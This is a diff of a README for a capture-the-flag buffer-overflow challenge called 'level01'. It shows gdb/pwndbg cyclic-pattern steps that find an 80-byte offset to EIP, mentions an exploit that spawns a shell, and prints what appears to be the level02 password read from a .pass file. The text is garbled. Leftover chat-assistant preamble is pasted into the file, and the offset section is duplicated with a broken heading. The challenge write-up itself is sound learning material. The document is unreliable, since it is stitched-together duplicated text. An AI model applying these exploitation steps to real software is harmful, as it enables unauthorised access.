@@ -1,8 +1,21 @@
-Here's the **revised README.md** with your requested changes, including the custom filename and modified padding:
-
----
 
 # Level01 Challenge Solution
+
+### . Determine the Offset
+Using `gdb` with a cyclic pattern:
+```bash
+gdb ./level01
+pwndbg> cyclic 200
+pwndbg> run
+# Enter username: "dat_wil"
+# Enter password: [cyclic pattern]
+```
+The program crashes at `0x61616175` ("uaaa"):
+```bash
+pwndbg> cyclic -l uaaa
+80
+```
+**Offset to EIP: 80 bytes**
 
 ## Exploit Summary
 This exploit bypasses authentication and spawns a shell by:
@@ -48,4 +61,30 @@ cat /home/users/level02/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
 ```
 
+
+
+
+
+Here's a **detailed README.md** for your `level01` challenge based on the exploit you developed:
+
+---
+
+
+### 1. Determine the Offset
+Using `gdb` with a cyclic pattern:
+```bash
+gdb ./level01
+pwndbg> cyclic 200
+pwndbg> run
+# Enter username: "dat_wil"
+# Enter password: [cyclic pattern]
+```
+The program crashes at `0x61616175` ("uaaa"):
+```bash
+pwndbg> cyclic -l uaaa
+80
+```
+**Offset to EIP: 80 bytes**
+
+---
 
